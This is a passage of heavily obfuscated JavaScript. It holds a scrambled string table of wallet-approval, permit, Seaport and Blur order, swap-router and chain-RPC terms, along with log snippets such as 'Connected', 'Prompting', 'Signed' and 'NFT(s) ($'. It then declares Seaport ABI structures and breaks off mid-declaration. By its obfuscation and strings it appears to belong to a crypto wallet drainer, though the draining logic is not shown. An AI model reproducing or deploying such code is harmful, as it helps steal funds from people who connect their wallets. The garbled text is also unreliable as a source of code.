'provider', 'OZKzJ', '_targetBlo', 'ehPma', 'amountInMa', 'routerAddr', '_positionT', 'tokenX', 'rhFDb', 'assets', 'Pancake', 'zkOmb', 'toWei', 'C-Chain', 'offerPunkF', 'unclaimed', 'c2fac7799b', 'hLSzr', 'fillmentCo', 'ftm', 'purchaseFr', 'getMarkets', '0x60f80121', 'tqbVW', '3731619542', 'totalSold', 'lkbRemove', '_onBehalf', 'setIsP2PDi', 'updatedUrl', 'llerNotOwn', 'cmJsA', '0x004C0050', 'atureTrans', 'criteriaPr', 'ePlkn', 'bHASV', 'sXwaf', 'BPktt', '_newOwner', 'WooFinance', '5951FA827D', 'ernance', 'idityETHWi', '🇬🇾', 'Moonbird', 'approveAss', 'osTransfer', 'LFBkQ', 'RrIci', 'nMin', 'validateER', 'ForAll', 'aZiMI', 'nceInOf', 'AFYSk', 'mEDBc', '_onlyOwner', 'lWOyy', 'EFA6802F40', 'E681fE6E41', 'includes', 'RWUuB', 'targetToke', 'cojow', 'gYsGx', 'ding', 'CwAlt', 'YNYjO', 'PunkOffere', '0x1e14', 'BKqhw', 'C20OnTrans', '_factoryV3', 'ByPxx', 'ir[]', 'UniswapV3', 'initialCha', 'bancor_swa', '0x10ED43C7', '466eec40da', 'amountOutM', 'aMUhb', 'mLGun', 'AdlIz', 'lYQnt', 'externalSw', 'getRoleMem', 'utOfRange', 'HqrHq', 'eft', 'setSwapSto', 'sxPSa', 'ece7362f91', 'https://fu', 'yXUYM', '6998466564', '7700', 'Ctjyq', 'Pangolin', 'Owners', 'uint160', 'inmnJ', 'ZggfX', 'olId', 'itBatch', '6f99059ff7', 'lCheckOnRe', 'MzomY', 'KLMNOPQRST', 'XFyPU', '🇧🇲', 'coinbase', '701803AF64', '697857fD54', 'nsferFrom', 'getAmountO', 'szxBC', 'PFupA', '0xabb3738f', 'zZPKn', 'AnhkA', '6964aF9D7e', 'sLVfK', 'gnatureTra', '_dstChainI', 'AymxJ', 'gBdTj', 'YcCxs', 'redeemRemo', 'shkZC', 'TMeoq', "Polygon Ma", '🇻🇬', "struct IV3", 'RedeemLoca', '0xa3fa99a1', 'qNFWq', '112Be9d758', 'NotOwnerOf', 'uidity', 'returnValu', 'idityAVAX', 'ens', 'outerV2.Sw', 'YmCVL', 'onversion', 'ReserveUse', 'wlbCc', 'Fjmsi', 'Minter', 'aiUKF', 'KwwFj', '🇦🇼', 'SLigP', 'pendingNet', 'ntToken', 'bjbHL', 'AxhyZ', 'OALSS', 'GudxC', 'https://pu', 'EqhYo', 'it[]', 'HMQFr', 'getCurrent', '1313161554', 'uint96', 'AOsIu', 'Authorizat', 'onVault', '_minOut', 'gNGpO', 'pewKM', 'transferOp', 'initPendin', 'byteCount', '3f1104b5e5', 'f9e5ea86d5', '97c13d831e', 'initialize', 'depositIds', 'PXKTA', 'BackUnback', 'floor', 'idVfA', '_register', 'CharCode', 'fillment[]', '_owner', 'VILzL', 'TokenHelpe', 'Tokens', "rn this\")(", 'jquLv', 'datnj', 'VukTK', 'ion', 'kRagF', 'transferDe', 'dRewardsPe', 'gger', 'jIrdC', 'ounter', 'egvWT', 'ERQqJ', 'isDeprecat', '🇳🇴', 'uRMYr', 'ApprovalCa', 'approvePlu', 'nBfef', 'jTpLD', 'imed', '3F4ce8392D', 'NeitherTok', 'kHTao', 'GZvNP', 'permit2Act', 'SpcbS', 'tokenAddre', 'lJBWj', 'SignatureE', 'sigDeadlin', 'Xgcyo', 'gUwRC', 'gWiny', '&dst=0xEee', '0x3845bada', "enum IAppr", 'removeDire', 'tDmYS', "enum Order", 'wBLqA', 'uHBri', 'srEsX', '🇳🇿', '223Bb4ffbd', 'convertFor', 'pi.kybersw', 'gYKaL', 'sbYMc', 'Index', 'EIJTK', 'FVCIj', 'dstPoolId', 'anEnd', 'bTOpi', "struct Tra", 'KoTbz', 'tepil', 'DOgvS', 'shibaswap', 'XMEaT', 'Kwnad', 'CzoZJ', 'pancakeAct', 'WrongToken', 'dAsCollate', 'https://et', 'zenSL', 'ntAllowanc', 'NoContract', 'd51d610c36', 'LBPair', 'YMdRf', 'olobP', 'AbFHk', 'interface', '_positionM', 'UxMRF', 'wiOXl', 'luoau', 'metis', 'amount0Del', 'nsfer.Perm', 'BeRUQ', 'nKVbA', 'ReserveAsC', 'SMlnZ', 'vWuoD', '0xb47e3cd8', 'pathname', 'thAuthoriz', 'LVpPq', 'HCkwK', '037C07e01e', 'onX', 'ZGhCa', 'xPZmr', 'jacmt', 'TkYEu', 'SenderIsNo', 'BlurExec', 'wfChZ', '14bd3903a5', 'outer', 'qZDdI', 'ferDetails', 'rBJlm', 'aVDyw', 'r__NonCont', 'TsBDG', 'TokenAddre', 'sHMoQ', 'chainRegis', 'Pkcs7', 'deposited', "Invalid by", '5782tNGQSR', 'iverErrorR', 'VwSKP', 'ATION_THRE', 'sxLeV', 'TsFfj', 'BXMSc', 'WooCrossSw', 'completeSi', 'IBLHQ', 'NotWhiteli', 'Timestamp', 'tWOvM', 'getLegacyR', 'dE984fFE2C', '0x4F01AeD1', 'binci', 'tHcuY', 'nft_array', 'Borrowed', 'PoolCollec', 'nCall', 'UncommitWr', '/overview)', 'iOngb', '_proof', 'nsfer.Allo', 'wordPos', 'JHSmr', 'Unpause', 'ticall.Spl', '🇪🇪', '_treasuryV', 'increaseAl', 'Ndbob', 'VMorM', 'mpts', 'Coin', 'opqrstuvwx', 'r__Transfe', 'count', 'zmbrE', 'poolType', 'increment', 'epositWith', " denied sw", '_prevOwner', 'MSBKQ', 'SmGQI', 'VqflM', 'ZnsIX', 'mmbNG', 'getAmountA', 'hKqfh', "This token", '1284', 'vpZQw', '02230091a7', 'kSSNJ', 'seaportNFT', "0x$1 ", '4876735704', 'ITSqa', 'bPGRV', 'tCoar', 'OfferAndCo', 'TransferTo', 'ForExactET', 'iplier', 'JvlJc', 'Normalized', 'aJxzS', '20582481eA', 'Cowswap', 'setProtoco', 'c.novanetw', 'verflows', "contract B", 'Invalid115', 'E2c860F3Ba', 'pluginDecr', 'DdlXk', 'rDTOC', 'lType', 'inId', 'sJoQK', '8A648BE133', 'ecipient', '_registry', 'b0ce3606eb', 'DmisP', 'YPyQb', 'LJHJM', 'teriaResol', 'inP2P', 'basefee', 'poolIndexe', '🇦🇺', 'mask', 'bDuGi', 'LengthMism', "or ", 'Asset', 'eKeOs', 'ZDnKK', 'pangolinAc', '_recipient', '_symbol', 'BD75cbab83', 'paths', 'cxeNg', 'YCudE', 'EZMLg', 'ffffffffff', 'jObIn', '795E0d380E', 'vernance', 'dcnQl', '0xc02aaa39', 'replace', '28bA3E5aF2', 'uint120', 'iQvnB', '6708198332', 'HashZero', 'POINTS', '57a175b88c', 'skAQC', 'bytes32', 'ucs2encode', 'mvr', '🇬🇼', 'P2PIndexCu', 'hecSX', 'AlreadyExi', 'startAmoun', 'splitSigna', 'punkBids', 'sDRhJ', 'QibOw', 'Approval', 'wViWu', 'increaseP2', 'gJAfh', 'getGasPric', 'difference', 'nZyzx', '_transferA', 'obkNh', 'ceil', 'Rzfzw', 'reduce', 'bPbvA', 'ORdhZ', '0xa5409ec9', 'href', 'MissingIte', 'address[]', " (Camelot)", 'ProvidedTo', ".html) [", 'isSupplyPa', 'NywvI', "enum Types", '/avalanche', 'mwOJr', 'ERGmG', 'utSinglePa', 'newCounter', 'JaosW', 'Requesting', 'mqEEp', 'deposit', 'signed', 'MintToZero', 'oldNonce', '_fromAmoun', 'kihfg', 'erMinter', 'https://op', 'setSellerC', 'lGLzm', '🇸🇳', '🇬🇫', 'lit', 'strategy', 'g.TimeRang', 'handleActi', 'tRvzX', 'ERyKE', 'typeToMult', 'optimism', 'VMkfT', 'kVMSM', 'Bancor', 'QDxzi', 'fzdwk', 'IgfYT', 'KMsQk', 'totalDebtB', 'feeRecipie', 'WaQEM', 'eADWI', '506c739EF4', 'rror', 'DDWLP', 'bool[]', 'orRevertBy', '1c002Ea5aE', 'offerIdent', '3C1e785363', 'DepositPai', 'LENDINGPOO', 'ZercT', 'oTAaN', 'CTRjC', 'cZZmp', 'CtEpp', '.0x.org', 'getBlockNu', 'executions', 'joKgx', 'alaPb', 'pIMfN', '9D02c28676', 'KEWmY', 'spookyswap', 'EXrQx', 'wapCallbac', 'pancake', '🇸🇻', 'actionType', '(Uniswap)', 'dStake[]', 'DLtSK', '18714eb63d', 'ithdrawWit', 'ilYPI', 'NeTZv', 'creationCo', 'Bc14f9669B', '0x1e128ef5', 'uJiIT', 'path', 'redeemLoca', 'MarketAlre', '🇵🇳', 'lZAXO', 'duitKey', 'KJGpt', 'WzcsQ', 'bFdf9eB090', '40f027b25E', '2a173976CA', 'ders', 'flashLoanP', 'JMPNJ', 'btUpdated', 'event', '🇷🇪', 'toToken', 'UVWXYZabcd', 'WyrIX', 'ions', 'gbjyw', 'getPunk', 'oleHour', 'key', '65de6e193b', 'LCbrX', "Signed (", '0x82aF4944', 'navigator', '3309029182', 'WAwWu', 'randomByte', 'yvLjG', "🫧 ", "ansfer ", 'gwvyi', 'vWfzx', 'vpoQG', 'nonce', 'slmaV', '0x9dda6ef3', 'table', 'tamp', 'eOnTransfe', 'https://ma', '_collatera', 'ff2bd086-3', 'frCSv', 'PLEYY', 'GPYaW', 'ntract', 'RZlAw', 'factory', 'kAeMf', 'amountToke', 'FlHzU', 'poolId', '🇫🇴', 'pendingWit', 'getBaycSta', 'YsdZB', 'maxPerAddr', 'EviXw', 'ils', 'EteHi', '_dstPoolId', 'XuUDm', 'xNcbd', 'IsMTc', 'VHfsb', 'CallerNotO', 'OrCriteria', 'exception', 'ReserveFee', 'teral', 'imitX96', '🇮🇪', '0x7a', '610f8954a3', 'KszxH', 'bd5d07dd0c', 'RWWGa', '0x17fc002b', '_functionT', 'plorer.zks', 'jbuDR', 'NaelW', 'D5CC832e61', 'unstakeBay', 'debu', '8734C71904', 'aDrfC', 'IfNecessar', 'KuBcR', '60a8d4e71d', 'dNWAN', 'ids', 'DeadlineEx', 'getOfferOr', 'Rbauo', '🇯🇴', 'vVcKL', 'HhYjl', 'culty', 'PbSLA', 'prevRegist', 'minterAllo', '0xe54ca865', 'EOAsV', 'ForNonexis', 'chainSwitc', 'Prukc', 'vkKXg', '85d5560999', '117mKdPUZ', 'nsfer.Sign', '2405439777', 'LQwEZ', 'validBefor', 'swapRemote', 'AMVir', 'IXMMO', 'item', 'addressPos', '🇸🇸', 'considerat', 'iMRYK', 'PivZP', 'expelFromN', 'erParamete', 'claimToTre', 'nPiYG', 'eLiquidity', '🇬🇵', 'withdrawTo', 'kensSuppor', 'fulfillBas', 'mPJeE', 'removeLiqu', 'error', 'ppage', 'nId', 'SUcGj', 'HlaLx', 'itemIndex', 'customerId', 'nDesired', 'BB8A73bA2C', 'CDUBb', '_isPaused', 'er[]', 'nftCount', "Transfer f", 'xnLTj', 'borrower', 'deploy', 'nft_transf', '0f116ddee9', '🇲🇸', 'mDQgA', 'sendERC115', 'OrderAlrea', 'bind', 'BCHEK', 'EFVyP', 'WPSHG', 'LkWgv', 'Nonces', 'egyAmount', 'RMoJG', " on ", '_to', 'mzIyC', 'inNATIVE', 'HORIZATION', 'HzYux', 'WooPPV2', 'instantRed', 'iELQP', 'charAt', 'MintedToTr', 'VLTMd', 'balanceToB', 'MasterVaul', 'vWPXa', 'FLASHLOAN_', 'URIQueryFo', 'wavax', 'erItem[]', 'XSnfj', 'IdDesiredO', 'ria', 'Kfjzl', '0x87870Bca', 'xMCQl', 'wyvernToke', 'UqBcj', "Prompting ", 'yZomg', '🇲🇾', 'uYyGx', 'ExceededCa', 'ancedOrder', 'ST_ETH', 'UXlam', 'hqgEn', 'xCursor', 'gas', 'ZeroAddres', 'b4c659F248', '_amounts', 'eFbIx', '_mintAmoun', 'YYaZt', 'ZeroEx', 'CANCEL_AUT', 'payload', 'mtFof', '3570985008', 'gbOXF', 'zksync', '0xd8dA6BF2', 'LTNrV', 'qUztj', '02bc14e878', 'Recipient[', '0x15d4c048', 'MHSgk', 'amountIn', 'DHWoc', '069d02ae04', 'RaYgh', 'erComponen', 'Tljqb', "Invalid co", 'sort', 'WueWL', 'rValue', 'setIsBorro', 'jwWfe', 'PFDVe', 'capPerPosi', '🇦🇱', 'MWtjr', 'KOORP', 'arbitrum', 'AJqEh', 'obridge', 'getSwapIn', '0x6131B5fa', '🇳🇨', 'dBIys', 'https://ft', '37ddf8e4c5', 'LiquidityM', 'zWIeY', 'int256', '9c85ebe478', 'dhzQf', 'YyuLh', 'zSFiF', 'approved', 'A292be6244', 'ken', 'argate', 'eYAsu', 'setTreasur', 'swapExactE', 'IsBorrowPa', 'hvsfJ', 'biscan.io', 'fiVBK', 'TuzWW', 'a34207e38c', 'trader', 'RdKjL', 'uaKun', '_sizeDelta', '0x0000007b', 'qualLastEn', 'escaper', 'sweepLBTok', 'ainNetwork', 'fkmJY', 'VflDf', '🇮🇷', 'ZFkbo', 'XiwaW', 'tegoryData', 'QKldl', 'plciK', 'ner', "Nova Netwo", 'apRouter.E', 'yYlyt', 'fDwZC', 'findIndex', 'isWithdraw', 'parameters', 'initNetwor', 'ntFlashLoa', 'QOAYC', 'FYQbf', 'timestamp', 'tSinglePar', 'kQVrz', 'arbitrum.a', 'auLxm', 'BOXxV', 'fjsCQ', 'lDEuL', "struct ISw", 'SrdPF', 'Accept', 'lEqSw', 'TLtlS', 'salt', 'Enabled', " (Special)", "struct IAp", 'rrowIndex', '0e5c4f27ea', 'tings', "Lone surro", 'TkGrc', 'TLWCd', 'oxQdL', 'rsor', 'duit', 'MvsEh', 'AMfSL', 'Withdraw', '_toAmount', 'Wyvern', 'EGHWR', 'onBehalfOf', 'offerFulfi', 'SdepQ', 'yPdcg', "ransfer ", '8aeb04b58e', 'kZWmg', 'NonERC721R', 'yWpzr', 'newRescuer', 'RSnqi', 'tryQuerySw', 'from', 'SvVJx', 'hxIKo', 'HUaCE', 'SjZLv', 'GBjBx', 'ed01230072', 'CDKYN', '🇸🇹', 'pauser', 'ddkST', 'onduitKey', 'QpiPd', 'pdCFx', 'uint256', '72E64C96A8', 'rebalanceS', 'Burn', 'efACJ', '0xd1747999', 'setInitial', 'bridgeToke', 'PgzdP', 'vBgwN', 'IqEoh', 'reshold', 'AmountSlip', 'SpRku', 'availableB', 'gmx', 'UVibo', 'SkkQk', 'MarketIsDe', 'EZgzP', '🇸🇩', 'ract', 'agLuN', 'eIPer', 'boVPh', 'PoolRemove', 'txId', '7d8b479975', '0x2019', 'll[]', '0x5f98805a', 'ibKAc', 'migrateLiq', 'reV', 'In=', 'permit', 'json', 'https://sn', 'correcting', 'hpXpF', 'SStjK', 'wszgj', 'ZHstb', 'qnNFt', 'grantRole', 'uidity)', 'zYyZa', 'jqJMA', 'EOpiH', 'WguWs', 'sPANa', '938b96d275', '0xaC5eE1CC', 'iTxVB', 'setReserve', 'IIJqt', 'utf8decode', 'Overflows', " Inc", 'uxFRC', '1fr96SNp', 'rno.celo.o', 'setUrl', 'pired', '🇯🇲', 'initiator', 'mainTokenI', 'ahash', 'aTypes.Use', '0xabefbc9f', 'Provider', 'newUrl', 'huhQH', '94B5Ca4314', 'hhQKy', '5d6c4ddA88', 'rgxtA', 'onlyOwnerC', 'Yakqx', '_minAmount', 'sion', 'premium', 'sersCannot', 'getDeploye', 'DNzuN', 'Token', '🇨🇿', 'ConduitErr', '717cAAD9A4', 'BSafr', '0x88625879', 'XRbEF', 'idityAVAXS', 'dNhtI', 'swap', 'kDlJI', 'yAaua', 'ETH', 'WjjxX', " (Aave Liq", 'tHeQo', 'borrowRate', 'approveZer', 'gvmZB', '🇬🇦', 'DSoMy', '3F5c83673c', 'F0aebE1553', 'AKC', 'nkYGv', 'wgxzL', 'c06a461d24', 'OogtU', 'int256[]', 'https://sc', 'ThJuR', 'MSVaY', 'getConfigu', 'token0', 'tokenPath', 'arb', 'rable', 'irhOY', '19d9989f39', 'AddressHel', 'EXPULSION_', 'nwIXa', 'UPmBQ', 'QqLTL', 'zSCwO', 'QwjiQ', 'isApproved', 'isPartiall', '1dc30c1957', 'glcUP', 'previousOw', '_lzTxParam', 'VzhGg', 'difficulty', 'PhIcf', 'NbZzV', 'ionsManage', 'efZDF', "Aurora Mai", 'sYqhpMzg8r', 'ailed', 'eOOTQ', 'a3640431e8', 'ckwMs', 'TGfSk', 'AEcjO', 'setStargat', 'yVnjY', '🇧🇴', 'erForSale', 'amountBDes', 'gZfRV', 'Dlgwm', '&sellAmoun', 'zcHAZ', 'YWORf', 'lACBR', 'D0bd40E75C', '_defaultLP', 'tery', 'action_typ', 'totalSize', 'qoOUC', 'fromAddres', 'Ids', 'initWithdr', 'ved', 'BraveWay', 'NkAGH', 'PairNotCre', '🇵🇦', 'hexToUtf8', 'LzJdx', " allows to", 'klSWE', 'dC176575eE', 'params', 'nctQs', 'qUeIQ', 'OwDSe', '0x0000', 'a106ae21c0', '49ea4c83a0', 'WYlLB', 'btsoP', '🇦🇬', 'AkgPR', '🇭🇹', 'ReserveFac', 'nuPBx', '🇧🇯', 'totalColla', " 💠", 'UniswapNFT', 'LHtcv', "🌀 [Unstake", "e) {}", 'utParams', 'prototype', 'Ybxqv', 'c66Dd9c48a', 'b0d097eB8D', '🇨🇾', 'kenActions', 'IFcpP', 'idityNATIV', 'ider', 'rNft', 'quickswap', " NFT(s) ($", 'XOZGV', '0x42', 'onfig', '0c01c996b4', 'nership', 'hrTjS', 'nce', 'qgnlp', 'increaseLi', 'diMvl', 'kEsgU', 'WNXQV', 'yPath', 'AczsG', 'uQNWG', '_maxAffili', 'laXRE', 'getSigner', 'rorascan.d', '442b040dd3', 'swapETHToT', 'conversion', 'BlurDelega', 'atching', '252b5b4814', 'tionData', 'CoBhc', 'gUuXY', 'bRWDQ', '🇮🇹', 'NiLfr', 'VkKhz', 'InvalidERC', 'UFayk', 'LZlnE', '_RATE_BORR', '0x794a6135', '_RESERVES', 'nvalidatio', 'OiYdA', 'kDivergenc', 'getEModeCa', 'restoreReg', 'https://ce', 'DefaultMax', 'QCQcu', '67028862bE', 'AwLYu', 'eam/mainne', 'YoKUF', '/app.zerio', 'OKFfx', 'pmmaI', 'setConfigu', 'estRateMod', 'InvalidFul', 'search', 'shibaSwapA', 'herscan.io', '_dstGasFor', 'encode', 'WtZvN', 'lDelta', 'tWNATIVE', 'tory', 'MIhpB', 'rdAjW', 'isBorrowPa', " (Uniswap)", 'WwyDg', 'ork.io:907', 'd19D4a2e9E', 'lAVfP', 'deBPZ', 'tryBlockAn', 'POST', '510863643E', 'reserve', 'oThenMaxMi', 'sts', 'tokenURI', 'terface', 'evertBytes', 'type', 'mHOle', 'lsWxx', 'postUpgrad', 'hJNZm', 'bHJwZ', 'selfPermit', 'getCounter', 'rChanged', '🇼🇸', 'roleEmerge', 'data', 'approvalER', 'RIWhi', 'ZHqOJ', 'nged', '🇨🇩', 'VrcJG', 'tradeBySou', 'fVVhp', 'DJyrN', 'EZPhB', '_user', 'tSyEl', 'kewSI', 'constants', 'Svski', 'signer', 'SluUr', 'OwnerUpdat', '🇭🇲', 'details', 'sendEthTyp', 'Iamnu', 'kTEEW', 'exhxN', 'feCfK', 'piNlN', 'th.com', 'ier', '4337', 'kyber', 'kpZIu', 'eGPoG', 'uYkAb', 'GuELS', 'HRoaO', ") ($", 'XoUvq', 'VkCZb', 'eceiverImp', 'token_addr', 'ithfd', '🇮🇴', 'BadReturnV', 'deCategory', 'orderCompo', "used to tr", 'HSupportin', 'qcVmR', 'kes', '🇪🇬', 'oXYIb', 'ned](', 'RateMode', 'setApprova', 'kSAzc', '3|2|0|4|1', 'ultSet', 'ULQJE', 'xagkm', 'ApproveToC', 'getAssetIn', 'UdnlQ', 'ForExactNA', 'yJnsv', 'getTimeRan', 'l.SwapObj', 'Revenue', '7D8a07e3bd', 'UUjAG', 'kensNotPai', 'uDSJb', 'token2', 'rmjBt', '_localDeci', 'rItem', 'LfMjt', 'rOutOfRang', 'HNPlz', 'pKBmh', 'gDnrD', 'nwsjd', 'allInitial', 'OrderCance', 'maxAffilia', 'setFees', 'ybOJs', 'ItppH', '0x55B916Ce', 'headers', 'kdiaa', 'OfferCrite', 'uidityPara', 'hain', 'RoleGrante', 'swapTokens', 'CdmXQ', 'uqCKU', 'basicOrder', 'TIVE', 'seFbg', 'ede563556b', 'tokenY', 'blacklist', 'PjhMx', 'aUzQp', 'a98b954eed', '🇧🇹', '4C56Bf30aC', 'QAYqS', 'numberWith', 'mint', 'split', 'offerToken', 'aDycH', 'unBlacklis', 'getRandomV', 'base.api.0', 'actions', '🇵🇬', '🇹🇭', "omething h", "nction() ", 'akedAmount', 'HJiuh', 'eThanOneAP', 'qmQic', 'aaveLP2Act', 'uter', 'pHour', "Finished a", 'proveAndCa', 'AZGmI', 'hMuhS', 'KTPIf', 'stargateRo', 'returnData', 'nusOne', 'znEjO', "th price", 'ionCompone', '🅰️', '_account', '🇸🇧', 'kSzRn', '0x64d91f12', 'otocolFee', 'TKEuB', 'BorrowNotP', 'rice', 'fEHsO', 'EBETo', 'CounterInc', 'doge', 'useATokens', 'getLegacyF', 'tuple[][]', '74b2276d25', 'htyMG', '0x13f4EA83', 'OIvcX', 'token1', 'ipNPX', 'a36c1db03b', '2eAca87185', 'PDeltas', 'CXdky', 'WEcpw', '🇻🇮', 'NJDHY', 'dyFilled', 'getApprove', 'getBakcSta', 'TabHh', 'CurveVyper', 'zKdTL', 't[]', '59d9a97bca', 'mDHle', 'lastReward', 'hdrawals', 'EntryPosit', 'loAju', '```', 'SXbgw', 'i.ethplore', '0x11111112', 'berCount', 'mponentOnA', 'InvalidAmo', 'ychain.io', 'iBvhf', 'edTimestam', 'sendTransa', 'ubkIX', 'BkkaA', 'Factory', 'priceSourc', 'erc1155', 'd9083c756c', 'GcIOS', 'WooPoolCha', 'GvBOq', 'mlYkR', 'approvedPl', '0x93b346b6', 'beam', 'ctions', '0x51f3d585', 'oCrossChai', 'idation', 'vAebO', '3Actions', '0x777777c9', 'erChanged', 'secondsAgo', 'xwLSv', 'hRatio', 'BXQzV', '949d033Da6', 'reserveIn', '🇺🇸', 'ZelMb', 'qaSNA', 'oDykI', 'MLWLy', 'srcAddress', '5241523fBa', 'ensIn', '0x6B175474', 'SeNBo', 'azCOM', 'Path', 'Canto', 'paused', '🇴🇲', 'eway.pokt.', 'c65F7E23f4', 'vlwnH', 'byteIndex', 'KQBGa', 'mponent[][', 'chainid', 'PROVIDER', 'OfferItem', 'PpZFn', 'magicValue', 'unStake', 'mode', 'eqFee', 'Ujvcx', 'gFgtD', 'gFeeOnTran', 'updateBlac', 'jtqEO', 'iNxBe', '_factory', 'pause', 'EltbH', '_toAddress', 'permitted', 'HDlfn', '8a4e094d1b', 'Quickswap', 'cachedSwap', 'Zvfbv', '64eAc0408E', 'vABHC', 'oXZDB', '0x81004C9b', 'api.com/v1', 'nUFIw', 'STqfO', 'UncqJ', 'amountNATI', 'WhatIsANet', 'gkQQf', 'uint40', 'ItnDp', 'oudflare-e', "Denied Cha", 'ZTllM', 'NgXOK', 'sitionAndS', 'Htnrz', 'arTcv', 'TokenPermi', 'ired', 'exactOutpu', '9ae18D2F14', 'QMMzk', 'cNxrx', 'EnPom', 'sersSet', 'lMLMY', 'yrYMz', 'totalBlur', 'wsnei', 'rConfigura', 'TOXHP', 'tes', 'yxAvC', 'ypSUa', '🇯🇵', 'pure', 'b2B501154D', 'bVeMa', '2Actions', 'owner', 'bypassCall', 'receiver', 'trade', 'FUwAB', 'PKNmL', 'tokenSymbo', " (Quickswa", 'nsideratio', 'PLS', 'callDelta', "Connected ", 'reserveOut', 'KTHzL', '0xB971eF87', 'bdpmu', 'bTOjq', 'eps', 'PspSH', 'maximumFul', " ETH", "add chain.", 'CAzza', 'rateMode', 'bVspx', '0x10f1', 'gfMtH', 'ReTWQ', 'WLrKj', 'IeJeN', 'withdrawAp', 'usedSet', 'XCguD', 'InvalidNat', '_operator', 'ctionary', 'VSrmu', "Received T", 'RLoet', 'pancakeV3S', 'ction', '0x557b933a', 'availableO', 'xkSrF', 'VoMGe', 'logEmptyWa', '/cypress', 'IXDFBNXD92', 'enableDepo', 'NMApa', 'izCgd', 'allowed', 'RbdyR', 'd8002f8b6b', '🇸🇪', 'AaveLP2', 'PVKsJ', 'setRoyalty', 'DeQul', 'icOrderPar', 'supplyBala', 'isWhitelis', 'ERC20', 'mSbWn', 'pWzwD', 'populateAc', 'CCPcx', 'uniswapv2', '/arbitrum', 'console', 'JvTsc', 'KgDmU', 'mnWNy', 'bc14f9669b', 'bcGBt', '_maxGasFor', 'cFPau', 'SugYx', 'msgValue', 'vJEQA', 'Cc3d62e298', 'actAddress', 'OjuZZ', 'KuBxB', '🇫🇲', '599b810425', '805512xXHSSW', 'heco', 'VfsOe', 'ReserveDat', 'HUhmc', 'Zgnto', 'ts[]', 'ivCYY', 'PSsry', 'QVasI', 'lcJEe', '0x8f3cf7ad', 'getUserCon', 'sActions', 'Nszpq', 'indices', 'ctBridgeTo', '_exitPosit', 'TkoYe', 'word', '0x8d6cebd7', 'cost', 'treasuryVa', 'klPkt', '_beneficia', 'KfIyo', 'tionCount', '078eA594c1', 'nonces', 'okensForTo', "struct Cri", 'nuTjo', 'qcmal', 'WAVAX', '.org', '0xA0b86991', 'AkBQb', 'uniswap_v3', 'WrongNativ', 'ess', 'fulfillAva', 'nextPunkIn', 'blockHash', '🇦🇩', 'kPLKf', 'SaeKI', 'eUZyQ', '_poolToken', 'LengthsMis', 'eRange', 'gPOQK', 'uint128', 'TzXNv', 'nFUcM', 'sferFrom', 'rFailed', 'D663fC04f8', 'xJDKDFGXDF', 'eCJaI', 'getSwapOut', "enum ILBRo", 'rHwLn', '🇩🇲', 'distributi', 'XOut', 'QLzBJ', 'setWooCros', 'p2pBorrowI', '🇧🇭', 'OKT', 'withdrawBi', 'proofToken', 'hezdn', 'cancel', 'FToQn', 'ULBtr', '5_DRY', 'ZNgYK', 'VQjkJ', "ING ON TO ", 'ahAlk', 'IZcIH', '(((.+)+)+)', 'zNNOU', 'qcTyT', 'cJkqj', 'not_found', 'SafeCast__', 'kyberActio', 'OfferItem[', 'EfWmo', 'ontract', 'cnRSd', 'leheh', 'exchangeVa', "Cdnext TYO", '_IdOverflo', 'bulkTransf', 'Refund', 'int24', 'hrUSW', 'PausedSet', 'forceAddCh', 'edForOrder', 'JiiCs', 'refId', '🇱🇧', 'https://ex', '_token', '0xc40f949f', '0x2ad6FA4d', 'getItem20', 'ute/build', 'isClicked', 'BCVN', 'results', 'customer_i', 'act', 'nNeDR', 'bsc.api.0x', 'configureE', '/message', "This addre", 'cYKOs', 'btAddress', 'xxevP'];
  _0x3ae7 = function () {
    return _0x4b0b38;
  };
  return _0x3ae7();
}
_0x4de35e.components = [_0x1ab7c8, _0x3c4b6d, _0x53e55b, _0x19dc8d, _0x1209d7];
_0x4de35e.internalType = "struct ReceivedItem";
_0x4de35e.name = 'item';
_0x4de35e.type = "tuple";
const _0x4e2eb8 = {
  internalType: 'address',
  name: "offerer",
  type: "address"
};
const _0x1d838a = {
  internalType: "bytes32",
  name: "conduitKey",
  type: 'bytes32'
};
const _0x2819f1 = {
  components: [_0x4de35e, _0x4e2eb8, _0x1d838a],
  internalType: "struct Execution[]",
  name: 'executions',
  type: 'tuple[]'
};
const _0x30f18b = {
  inputs: [_0x2d2083, _0x2cb8be, _0x97d2dd, _0x37c731, _0x5eecbe],
  name: "fulfillAvailableOrders",
  outputs: [_0x4ea4a9, _0x2819f1],
  stateMutability: "payable",
  type: "function"
};
const _0x3e3e55 = {
  internalType: "address",
  name: "considerationToken",
  type: 'address'
};
const _0x21e022 = {
  internalType: "uint256",
  name: "considerationIdentifier",
  type: 'uint256'
};
const _0x43b38a = {
  internalType: "uint256",
  name: "considerationAmount",
  type: 'uint256'
};
const _0x5aeb57 = {
  internalType: "address payable",
  name: 'offerer',
  type: "address"
};
const _0x33d0cf = {
  internalType: 'address',
  name: "zone",
  type: "address"
};
const _0x4e0d09 = {
  internalType: "address",
  name: "offerToken",
  type: 'address'
};
const _0x4e701f = {
  internalType: "uint256",
  name: "offerIdentifier",
  type: 'uint256'
};
const _0x4a60b9 = {
  internalType: 'uint256',
  name: "offerAmount",
  type: "uint256"
};
const _0x16b4fc = {
  internalType: "enum BasicOrderType",
  name: "basicOrderType",
  type: "uint8"
};
const _0x312e7d = {
  internalType: "uint256",
  name: "startTime",
  type: 'uint256'
};
const _0x1ed536 = {
  internalType: "uint256",
  name: "endTime",
  type: 'uint256'
};
const _0x4bf23d = {
  internalType: "bytes32",
  name: "zoneHash",
  type: "bytes32"
};
const _0x26895f = {
  internalType: "uint256",
  name: "salt",
  type: 'uint256'
};
const _0x510b89 = {
  internalType: 'bytes32',
  name: "offererConduitKey",
  type: "bytes32"
};
const _0x4b7d48 = {
  internalType: "bytes32",
  name: "fulfillerConduitKey",
  type: "bytes32"
};
const _0x4b863b = {
  internalType: "uint256",
  name: "totalOriginalAdditionalRecipients",
  type: "uint256"
};
const _0x30944e = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x5cdd4b = {
  internalType: "address payable",
  name: 'recipient',
  type: "address"
};
const _0x34a25c = {
  components: [_0x30944e, _0x5cdd4b],
  internalType: "struct AdditionalRecipient[]",
  name: "additionalRecipients",
  type: "tuple[]"
};
const _0x1eaeb2 = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x28ef34 = {
